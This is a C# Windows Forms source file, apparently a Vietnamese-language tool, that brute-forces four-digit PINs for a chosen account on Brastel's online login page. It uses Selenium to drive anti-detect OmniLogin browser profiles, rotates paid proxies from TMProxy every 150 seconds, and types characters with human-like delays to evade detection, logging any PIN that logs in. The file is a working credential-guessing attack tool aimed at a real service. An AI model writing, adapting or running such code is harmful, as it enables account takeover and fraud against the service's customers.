using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BrastelPin
{
    public partial class MainForm : Form
    {
        private GUIDataModel _gUIDataModel = null;
        private OmniLoginProfileManager _omniLoginProfileManager;
        private ProxyResponse _currentProxy;
        private DateTime _proxyStartTime;




        private Queue<int> _pinQueue = new Queue<int>();
        private object _queueLock = new object();

        public MainForm()
        {
            InitializeComponent();
        }

        private async void btnStart_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(_gUIDataModel.AccountCode))
            {
                MessageBox.Show("Vui lòng kiểm tra account code");
                return;
            }
            if (_gUIDataModel.PinFrom > _gUIDataModel.PinTo)
            {
                MessageBox.Show("Vui lòng kiểm tra mã PIN");
                return;
            }
            if (string.IsNullOrEmpty(_gUIDataModel.TMProxy))
            {
                MessageBox.Show("Vui lòng kiểm tra TMProxy");
                return;
            }


            // Khởi tạo queue PIN
            _pinQueue.Clear();
            for (int i = _gUIDataModel.PinFrom; i <= _gUIDataModel.PinTo; i++)
                _pinQueue.Enqueue(i);

            AddLog($"[INFO] Bắt đầu kiểm tra mã PIN cho accCode: {_gUIDataModel.AccountCode}.");

            ToogleControl(false);



            await Task.Run(() => WorkerThread());

            AddLog("[INFO] Đã hoàn tất kiểm tra toàn bộ mã PIN.");


            ToogleControl(true);
        }


        private void ToogleControl(bool enable)
        {
            txtAccountCode.Enabled = enable;
            txtPinFrom.Enabled = enable;
            txtPinTo.Enabled = enable;
            txtTMProxy.Enabled = enable;
            txtOmniloginURL.Enabled = enable;

            btnDeleteAllProfiles.Enabled = enable;

            btnStart.Enabled = enable;
            btnStop.Enabled = !enable;
        }


        private async void WorkerThread()
        {
            bool firstGetProxy = true;
            int countCheck1Profile = 0;


            while (true)
            {
                countCheck1Profile = 0;

                if ((firstGetProxy == true) || ((DateTime.Now - _proxyStartTime).TotalSeconds > 150))
                {
                    firstGetProxy = false;
                    while (true)
                    {
                        _currentProxy = await GetProxyAsync();
                        if (_currentProxy != null)
                        {
                            AddLog($"[INFO] Proxy đã lấy: {_currentProxy.data.https}.");
                            _proxyStartTime = DateTime.Now;
                            break;
                        }
                        else
                        {
                            AddLog("[ERROR] Lấy proxy thất bại. Thử lại sau 30 giây...");
                            await Task.Delay(30000);
                        }
                    }
                }


                int pin;

                lock (_queueLock)
                {
                    if (_pinQueue.Count == 0) return;
                    pin = _pinQueue.Dequeue();
                }

                string pinStr = pin.ToString("D4");

                try
                {
                    string profileId = await _omniLoginProfileManager.CreateProfileAsync("");
                    if (string.IsNullOrEmpty(profileId))
                    {
                        AddLog($"[ERROR] Không tạo được profile.");
                        break;
                    }
                    AddLog($"[INFO] Tạo profile thành công: {profileId}");

                    int port = await _omniLoginProfileManager.StartProfileAndGetPortAsync(profileId);
                    if (port == 0)
                    {
                        AddLog($"[ERROR] Không khởi động được profile.");
                        break;
                    }
                    AddLog($"[INFO] Profile đã chạy trên cổng: {port}");

                    using (ChromeDriver driver = _omniLoginProfileManager.GetChromeDriverFromPort(port))
                    {
                        driver.Navigate().GoToUrl("https://www.brastel.com/eng/myaccount");

                    CHECK_FUNCTION:
                        // accCodeInput
                        var accCodeInput = driver.FindElement(By.Id("accCodeInput"));
                        for (int i = 0; i < 10; i++)
                        {
                            accCodeInput.SendKeys(OpenQA.Selenium.Keys.Backspace);
                            Thread.Sleep(15);
                        }
                        foreach (char c in _gUIDataModel.AccountCode)
                        {
                            accCodeInput.SendKeys(c.ToString());
                            Thread.Sleep(150);
                        }

                        // pinInput
                        var pinInput = driver.FindElement(By.Id("pinInput"));
                        for (int i = 0; i < 10; i++)
                        {
                            pinInput.SendKeys(OpenQA.Selenium.Keys.Backspace);
                            Thread.Sleep(15);
                        }
                        foreach (char c in pinStr)
                        {
                            pinInput.SendKeys(c.ToString());
                            Thread.Sleep(150);
                        }
                        foreach (char c in pinStr)
                        {
                            pinInput.SendKeys(c.ToString());
                            Thread.Sleep(150);
                        }

                        // Button SIGN IN
                        var btnSignIn = driver.FindElement(By.XPath("//button[contains(text(), 'SIGN IN')]"));
                        ((IJavaScriptExecutor)driver).ExecuteScript("arguments[0].click();", btnSignIn);

                        Thread.Sleep(5000);

                        var findErrorDisplay = driver.FindElement(By.XPath("//span[contains(normalize-space(), 'Invalid User ID or PIN.')]"));
                        if (findErrorDisplay.Displayed)
                        {
                            Invoke(new Action(() =>
                            {
                                AddLog($"[CHECKED] PIN {pinStr} sai.");
                            }));
                        }
                        else
                        {
                            Invoke(new Action(() =>
                            {
                                AddLog($"[SUCCESS] Đăng nhập thành công với PIN: {pinStr}.");
                            }));

                            await _omniLoginProfileManager.StopProfileAsync(profileId);
                            await _omniLoginProfileManager.DeleteProfileAsync(profileId);
                            break;
                        }

                        countCheck1Profile++;
                        if (countCheck1Profile < 10)
                        {
                            bool isEmptyQueue = false;
                            lock (_queueLock)
                            {
                                if (_pinQueue.Count == 0)
                                {
                                    isEmptyQueue = true;
                                }
                                else
                                {
                                    pin = _pinQueue.Dequeue();
                                }
                            }
                            if (isEmptyQueue)
                            {
                                await _omniLoginProfileManager.StopProfileAsync(profileId);
                                await _omniLoginProfileManager.DeleteProfileAsync(profileId);
                                break;
                            }
                            else
                            {
                                pinStr = pin.ToString("D4");
                                goto CHECK_FUNCTION;
                            }
                        }

                        await _omniLoginProfileManager.StopProfileAsync(profileId);
                        await _omniLoginProfileManager.DeleteProfileAsync(profileId);
                    }
                }
                catch (Exception ex)
                {
                    Invoke(new Action(() =>
                    {
                        AddLog($"[ERROR] {ex.Message}.");
                    }));
                }
            }
        }


        private async Task<ProxyResponse> GetProxyAsync()
        {
            string url = "https://tmproxy.com/api/proxy/get-new-proxy";
            string apiKey = _gUIDataModel.TMProxy;

            var json =
                $@"{{
                    ""api_key"": ""{apiKey}"",
                    ""id_location"": 0,
                    ""id_isp"": 0
                }}";

            using (HttpClient client = new HttpClient())
            {
                var content = new StringContent(json, Encoding.UTF8, "application/json");

                try
                {
                    HttpResponseMessage response = await client.PostAsync(url, content);
                    string result = await response.Content.ReadAsStringAsync();

                    // Deserialize JSON response
                    var proxyResponse = JsonConvert.DeserializeObject<ProxyResponse>(result);

                    if (proxyResponse != null && proxyResponse.code == 0)
                    {
                        return proxyResponse;
                    }
                    else
                    {
                        return null;
                    }
                }
                catch
                {
                    return null;
                }
            }
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            _omniLoginProfileManager = new OmniLoginProfileManager(_gUIDataModel.OmniloginURL);

            _gUIDataModel = GUIDataModel.LoadFromFile();
            txtAccountCode.Text = _gUIDataModel.AccountCode;
            txtPinFrom.Text = _gUIDataModel.PinFrom.ToString();
            txtPinTo.Text = _gUIDataModel.PinTo.ToString();
            txtTMProxy.Text = _gUIDataModel.TMProxy;
            txtOmniloginURL.Text = _gUIDataModel.OmniloginURL;

            txtAccountCode.TextChanged += new EventHandler(TextBoxTextChanged);
            txtPinFrom.TextChanged += new EventHandler(TextBoxTextChanged);
            txtTMProxy.TextChanged += new EventHandler(TextBoxTextChanged);
            txtPinTo.TextChanged += new EventHandler(TextBoxTextChanged);
            txtOmniloginURL.TextChanged += new EventHandler(TextBoxTextChanged);

            _proxyStartTime = DateTime.Now;
        }

        private void rtbLog_TextChanged(object sender, EventArgs e)
        {
            rtbLog.SelectionStart = rtbLog.Text.Length;
            rtbLog.ScrollToCaret();
        }

        private void TextBoxTextChanged(object sender, EventArgs e)
        {
            try
            {
                _gUIDataModel.AccountCode = txtAccountCode.Text;
                _gUIDataModel.PinFrom = int.Parse(txtPinFrom.Text);
                _gUIDataModel.PinTo = int.Parse(txtPinTo.Text);
                _gUIDataModel.TMProxy = txtTMProxy.Text;
                _gUIDataModel.OmniloginURL = txtOmniloginURL.Text;
                _gUIDataModel.SaveToFile();
            }
            catch
            {

            }
        }

        private void TextBoxPinKeyPress(object sender, KeyPressEventArgs e)
        {
            if (char.IsControl(e.KeyChar))
            {
                return;
            }

            if (!char.IsDigit(e.KeyChar))
            {
                e.Handled = true;
                return;
            }

            TextBox tb = sender as TextBox;

            string newText = tb.Text.Insert(tb.SelectionStart, e.KeyChar.ToString());

            if (int.TryParse(newText, out int value))
            {
                if (value > 9999)
                {
                    e.Handled = true;
                }
            }
            else
            {
                e.Handled = true;
            }
        }


        private void AddLog(string log)
        {
            rtbLog.Invoke(new Action(() =>
            {
                rtbLog.AppendText(log + Environment.NewLine);
            }));
        }


        private async void btnDeleteAllProfiles_Click(object sender, EventArgs e)
        {
            bool enableControl = false;
            txtAccountCode.Enabled = enableControl;
            txtPinFrom.Enabled = enableControl;
            txtPinTo.Enabled = enableControl;
            txtTMProxy.Enabled = enableControl;
            txtOmniloginURL.Enabled = enableControl;
            btnDeleteAllProfiles.Enabled = enableControl;
            btnStart.Enabled = enableControl;
            btnStop.Enabled = enableControl;

            bool result = await _omniLoginProfileManager.DeleteAllProfilesAsync();
            if (result)
            {
                AddLog("[INFO] Xóa tất cả profiles thành công.");
            }
            else
            {
                AddLog("[ERROR] Xóa tất cả profiles thất bại.");
            }

            enableControl = true;
            txtAccountCode.Enabled = enableControl;
            txtPinFrom.Enabled = enableControl;
            txtPinTo.Enabled = enableControl;
            txtTMProxy.Enabled = enableControl;
            txtOmniloginURL.Enabled = enableControl;
            btnDeleteAllProfiles.Enabled = enableControl;
            btnStart.Enabled = enableControl;
            btnStop.Enabled = enableControl;
        }
    }
}